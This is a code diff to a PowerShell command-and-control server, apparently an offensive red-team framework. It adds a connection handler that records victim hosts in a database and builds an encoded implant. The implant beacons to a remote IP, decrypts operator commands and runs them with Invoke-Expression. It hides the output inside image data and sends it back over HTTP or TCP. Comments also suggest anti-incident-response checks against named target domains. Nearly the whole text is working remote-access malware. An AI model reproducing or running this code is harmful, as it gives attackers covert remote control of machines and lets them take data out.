@@ -1058,8 +1058,243 @@ while ($listener.IsListening)
 
 </scriptlet>'
     }
+    if (($request.Url -match '/daisy') -and (($request.Cookies[0]).Name -match 'SessionID'))
+    {
+        # generate randon uri
+        $randomuri = Get-RandomURI -Length 15
+        $randomuriarray += $randomuri
 
-    if (($request.Url -match '/connect$') -and (($request.Cookies[0]).Name -match 'SessionID'))
+        # create new key for each implant comms
+        $key = Create-AesKey
+        $endpointip = $request.RemoteEndPoint
+        $cookieplaintext = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(($request.Cookies[0]).Value))
+        $im_domain,$im_username,$im_computername,$im_arch,$im_pid = $cookieplaintext.split(";",5)
+
+        ## add anti-ir and implant safety mechanisms here!
+        #
+        # if ($im_domain -ne "blorebank") { do something }
+        # if ($im_domain -ne "safenet") { do something }
+        #
+        ## add anti-ir and implant safety mechanisms here!
+        #$sound = new-Object System.Media.SoundPlayer;
+        #$sound.SoundLocation="C:\Temp\PowershellC2\Sounds\pwned.wav";
+        #$sound.Play()
+        Write-Host "New host connected: (uri=$randomuri, key=$key)" -ForegroundColor Green
+        Write-Host "$endpointip | PID:$im_pid | Sleep:$defaultbeacon | $im_computername $im_domain ($im_arch) "`n -ForegroundColor Green
+
+        $Query = 'INSERT INTO Implants (RandomURI, User, Hostname, IpAddress, Key, FirstSeen, LastSeen, PID, Arch, Domain, Alive, Sleep, ModsLoaded)
+        VALUES (@RandomURI, @User, @Hostname, @IpAddress, @Key, @FirstSeen, @LastSeen, @PID, @Arch, @Domain, @Alive, @Sleep, @ModsLoaded)'
+
+        Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
+            RandomURI = $randomuri
+            User      = $im_username
+            Hostname  = $im_computername
+            IpAddress = $request.RemoteEndPoint
+            Key       = $key
+            FirstSeen = "$(Get-Date)"
+            LastSeen  = "$(Get-Date)"
+            PID  = $im_pid
+            Arch = $im_arch
+            Domain = $im_domain
+            Alive = "Yes"
+            Sleep = $defaultbeacon
+            ModsLoaded = ""
+        }
+
+        $message = '
+
+$key="' + "$key"+'"
+$sleeptime = '+$defaultbeacon+'
+$payload = "' + "$payload"+'"
+
+function getimgdata($cmdoutput) {
+    $icoimage = "'+$imageArray[-1]+'","'+$imageArray[0]+'","'+$imageArray[1]+'","","'+$imageArray[2]+'","'+$imageArray[3]+'"
+    $image = $icoimage|get-random
+
+    function randomgen 
+    {
+        param (
+            [int]$Length
+        )
+        $set    = "abcdefghijklmnopqrstuvwxyz0123456789".ToCharArray()
+        $result = ""
+        for ($x = 0; $x -lt $Length; $x++) 
+        {$result += $set | Get-Random}
+        return $result
+    }
+    $imageBytes = [Convert]::FromBase64String($image)
+    $maxbyteslen = 1500
+    $imagebyteslen = $imageBytes.Length
+    $paddingbyteslen = $maxbyteslen - $imagebyteslen
+
+    $BytePadding = [system.Text.Encoding]::UTF8.GetBytes((randomgen $paddingbyteslen))
+    $ImagePlusPad = New-Object byte[] $maxbyteslen
+    $ImagePlusPadBytes = ($imageBytes+$BytePadding)
+    $CombinedBytes = $ImagePlusPadBytes.length
+
+    $CmdBytes = $cmdoutput
+    $CmdBytesLen = $CmdBytes.Length
+
+    $CombinedByteSize = $CmdBytesLen + $CombinedBytes
+    $FullBuffer = New-Object byte[] $CombinedByteSize
+
+    $FullBuffer = ($ImagePlusPadBytes+$CmdBytes)
+    $FullBufferSize = $FullBuffer.length
+    return $FullBuffer
+}
+
+function Create-AesManagedObject($key, $IV) {
+    $aesManaged = New-Object "System.Security.Cryptography.RijndaelManaged"
+    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+    $aesManaged.BlockSize = 128
+    $aesManaged.KeySize = 256
+    if ($IV) {
+    if ($IV.getType().Name -eq "String") {
+    $aesManaged.IV = [System.Convert]::FromBase64String($IV)
+    }
+    else {
+    $aesManaged.IV = $IV
+    }
+    }
+    if ($key) {
+    if ($key.getType().Name -eq "String") {
+    $aesManaged.Key = [System.Convert]::FromBase64String($key)
+    }
+    else {
+    $aesManaged.Key = $key
+    }
+    }
+    $aesManaged
+}
+
+function Encrypt-String($key, $unencryptedString) {
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
+    $aesManaged = Create-AesManagedObject $key
+    $encryptor = $aesManaged.CreateEncryptor()
+    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
+    [byte[]] $fullData = $aesManaged.IV + $encryptedData
+    #$aesManaged.Dispose()
+    [System.Convert]::ToBase64String($fullData)
+}
+
+function Decrypt-String($key, $encryptedStringWithIV) {
+    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
+    $IV = $bytes[0..15]
+    $aesManaged = Create-AesManagedObject $key $IV
+    $decryptor = $aesManaged.CreateDecryptor();
+    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
+    #$aesManaged.Dispose()
+    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
+}
+function Encrypt-String2($key, $unencryptedString) {
+    $unencryptedBytes = [system.Text.Encoding]::UTF8.GetBytes($unencryptedString)
+    $CompressedStream = New-Object IO.MemoryStream
+    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
+    $DeflateStream.Write($unencryptedBytes, 0, $unencryptedBytes.Length)
+    $DeflateStream.Dispose()
+    $bytes = $CompressedStream.ToArray()
+    $CompressedStream.Dispose()
+    $aesManaged = Create-AesManagedObject $key
+    $encryptor = $aesManaged.CreateEncryptor()
+    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
+    [byte[]] $fullData = $aesManaged.IV + $encryptedData
+    $fullData
+}
+function Decrypt-String2($key, $encryptedStringWithIV) {
+    $bytes = $encryptedStringWithIV
+    $IV = $bytes[0..15]
+    $aesManaged = Create-AesManagedObject $key $IV
+    $decryptor = $aesManaged.CreateDecryptor()
+    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
+    $output = (New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$unencryptedData)), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd()
+    $output
+    #[System.Text.Encoding]::UTF8.GetString($output).Trim([char]0)
+}
+$RandomURI="'+$randomuri+'"
+$Server = "http://172.16.0.118:12345/'+$randomuri+'"
+$ServerClean = "http://172.16.0.118:12345/"
+while($true)
+{
+    $date = (Get-Date -Format "dd/MMM/yyyy")
+    $killdate = (Get-Date -Date "'+$killdatefm+'")
+    if ($killdate -lt $date) {exit}
+
+    $sleeptimeran = $sleeptime, ($sleeptime * 1.1), ($sleeptime * 0.9)
+    $newsleep = $sleeptimeran|get-random
+    if ($newsleep -lt 1) {$newsleep = 5} 
+    start-sleep $newsleep
+    $ReadCommand = (Get-Webclient).DownloadString("$Server")
+
+    while($ReadCommand) {
+        $ReadCommandClear = Decrypt-String $key $ReadCommand
+        $error.clear()
+        if ($ReadCommandClear -ne "fvdsghfdsyyh") {
+            if  ($ReadCommandClear.ToLower().StartsWith("upload-file")) {
+
+                $Output = Invoke-Expression $ReadCommandClear | out-string
+                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
+                if ($ReadCommandClear -match ("(.+)Base64")) { $result = $Matches[0] }
+                $ModuleLoaded = Encrypt-String $key $result
+                $Output = Encrypt-String2 $key $Output
+                $UploadBytes = getimgdata $Output
+                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
+
+            } elseif  ($ReadCommandClear.ToLower().StartsWith("loadmodule")) {
+
+                $modulename = $ReadCommandClear -replace "LoadModule",""
+                write-host $modulename
+                $Output = Invoke-Expression $modulename | out-string  
+                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
+                $ModuleLoaded = Encrypt-String $key "ModuleLoaded"
+                $Output = Encrypt-String2 $key $Output
+                $UploadBytes = getimgdata $Output
+                #(Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
+
+            } else {
+
+                $Output = Invoke-Expression $ReadCommandClear | out-string  
+                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
+                $StdError = ($error[0] | Out-String)
+                if ($StdError){
+                $Output = $Output + $StdError
+                $error.clear()
+            }
+            write-host $output
+            $Output = Encrypt-String2 $key $Output
+            $UploadBytes = getimgdata $Output
+
+            try
+            {
+                $client = New-Object System.Net.Sockets.TCPClient("172.16.0.118", 12345)
+                $stream = $client.GetStream()
+                $bytes = New-Object System.Byte[] 5520420                
+                $cookie = $ReadCommand + "NudsWdidf4reWDnNFUE"
+                $URIBytes = [system.Text.Encoding]::UTF8.GetBytes($cookie+$RandomURI)
+                $CombinedByteSize = $URIBytes + $UploadBytes                
+                $stream.Write($CombinedByteSize,0,$CombinedByteSize.Length)
+                $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
+                $data = $EncodedText.GetString($CombinedByteSize,0,$CombinedByteSize.Length)
+                $stream.Flush()  
+                $client.Close()
+            }
+            catch
+            {
+	            Write-Host -ForegroundColor Red "failed"
+	            exit -1
+            }
+
+            }
+        }
+    break
+    }
+}'
+
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($message)
+$message =[Convert]::ToBase64String($Bytes)
+
+    }
+    if (($request.Url -match '/connect') -and (($request.Cookies[0]).Name -match 'SessionID'))
     {
         # generate randon uri
         $randomuri = Get-RandomURI -Length 15
@@ -1360,7 +1595,6 @@ $message =[Convert]::ToBase64String($Bytes)
 
             #if you want to look at the image that is transfered back each time :)
             [io.file]::WriteAllBytes("$global:newdir\TempHeuristicImage.png", $Buffer)
-            
             $encryptedString = $buffer[1500..$size2]
             $cookiesin = $request.Cookies -replace 'SessionID=', ''
             $cookieplaintext = Decrypt-String $key $cookiesin   
